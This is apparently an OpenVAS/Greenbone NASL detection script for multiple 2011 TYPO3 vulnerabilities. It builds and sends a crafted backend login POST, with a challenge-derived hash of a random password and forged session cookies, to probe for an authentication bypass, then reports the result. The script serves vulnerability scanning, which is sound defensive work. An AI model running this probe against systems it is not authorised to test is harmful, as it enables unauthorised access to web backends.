# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:typo3:typo3";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804210");
  script_version("2025-01-21T05:37:33+0000");
  script_cve_id("CVE-2011-4626", "CVE-2011-4627", "CVE-2011-4628", "CVE-2011-4629",
                "CVE-2011-4630", "CVE-2011-4631", "CVE-2011-4632", "CVE-2011-4901",
                "CVE-2011-4902", "CVE-2011-4903");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-11-08 16:38:00 +0000 (Fri, 08 Nov 2019)");
  script_tag(name:"creation_date", value:"2014-01-07 15:31:34 +0530 (Tue, 07 Jan 2014)");
  script_name("TYPO3 Multiple Vulnerabilities (TYPO3-CORE-SA-2011-001) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_typo3_http_detect.nasl", "logins.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("typo3/http/detected");

  script_xref(name:"URL", value:"https://typo3.org/security/advisory/typo3-core-sa-2011-001");
  script_xref(name:"URL", value:"http://secunia.com/advisories/45557/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49072");

  script_tag(name:"summary", value:"TYPO3 is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2011-4626: Cross-site Scripting (XSS) via the 'JSwindow' property of the typolink function

  - CVE-2011-4627: Information Disclosure on the backend

  - CVE-2011-4628: Authentication bypass in the backend through a crafted request

  - CVE-2011-4629: XSS via the admin panel

  - CVE-2011-4630: XSS via the browse_links wizard

  - CVE-2011-4631: XSS via the system extension recycler

  - CVE-2011-4632: XSS via the tcemain flash message

  - CVE-2011-4901: Arbitrary information extraction from the TYPO3 database

  - CVE-2011-4902: Arbitrary file deletion on the webserver

  - CVE-2011-4903: XSS via the RemoveXSS function");

  script_tag(name:"affected", value:"TYPO3 versions prior to 4.3.12, 4.4.x prior to 4.4.9 and 4.5.x
  prior to 4.5.4.");

  script_tag(name:"solution", value:"Update to version 4.3.12, 4.4.9, 4.5.4 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("url_func.inc");
include("http_func.inc");
include("misc_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/typo3/index.php";
treq = http_get(item:url, port:port);
tres = http_send_recv(port:port, data:treq, bodyonly:FALSE);

username = urlencode(str:get_kb_item("http/login"));
password = rand_str(length:10);

if(!username)
  username = "admin";

useragent = http_get_user_agent();
host = http_host_name(port:port);

challenge = eregmatch(pattern:'name="challenge" value="([a-z0-9]+)"' , string:tres);
if(!challenge)
  exit(0);

password = hexstr(MD5(password));
userident = hexstr(MD5(username + ":" + password + ":" + challenge[1]));
payload = "login_status=login&username=" + username + "&p_field=&commandLI=Log+In&" +
          "userident=" + userident + "&challenge=" + challenge[1] + "&redirect_url=" +
          "alt_main.php&loginRefresh=&interface=backend";

tcookie = eregmatch(pattern:"(be_typo_user=[a-z0-9]+\;)", string:tres);
PHPSESSID = eregmatch(pattern:"(PHPSESSID=[a-z0-9]+\;?)", string:tres);

if(!PHPSESSID[1])
  PHPSESSID[1] = "PHPSESSID=37dh7b4vkprsui40hmg3hf4716";

if(!tcookie[1] || !PHPSESSID[1])
  exit(0);

cCookie = tcookie[1] + ' showRefMsg=false; ' + PHPSESSID[1] + " typo3-login-cookiecheck=true";

req = string("POST ", url, " HTTP/1.0\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Referer: http://", host, dir, "/typo3/alt_menu.php \r\n",
             "Connection: keep-alive\r\n",
             "Cookie: ", cCookie, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(payload), "\r\n\r\n",
             payload);
buf = http_keepalive_send_recv(port:port, data:req);
if(buf && buf =~ "^HTTP/1\.[01] 200" && "Expires: 0" >< buf) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
